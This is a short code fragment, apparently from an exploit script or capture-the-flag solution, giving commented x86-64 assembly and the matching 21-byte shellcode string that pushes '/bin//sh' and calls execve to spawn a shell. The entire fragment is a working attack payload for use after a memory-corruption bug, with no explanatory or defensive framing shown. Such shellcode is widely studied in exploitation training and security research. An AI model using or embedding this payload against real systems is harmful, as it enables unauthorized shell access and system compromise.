# push rax
# xor rdx, rdx
# mov rbx, 0x68732f2f6e69622f
# push rbx
# push rsp
# pop rdi
# mov al, 59
# syscall
shellcode = b"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
